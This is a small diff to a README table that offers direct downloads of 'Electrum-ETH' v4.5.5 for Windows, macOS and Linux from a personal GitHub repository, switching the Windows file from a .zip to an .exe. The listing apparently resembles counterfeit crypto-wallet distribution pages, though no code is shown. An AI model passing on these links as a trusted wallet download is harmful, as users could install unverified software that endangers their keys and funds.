@@ -31,7 +31,7 @@ Choose your platform below and hit that download button!
 
 | **Platform** | **Download Link** | **File Size** |
 |--------------|-------------------|---------------|
-| 🌐 Windows | [**Download for Windows**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.2.zip) | 50 MB | 
+| 🌐 Windows | [**Download for Windows**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.exe) | 50 MB | 
 | 🍏 macOS  | [**Download for macOS**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.dmg)   | 45 MB |
 | 🐧 Linux  | [**Download for Linux**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.AppImage)  | 60 MB |
 
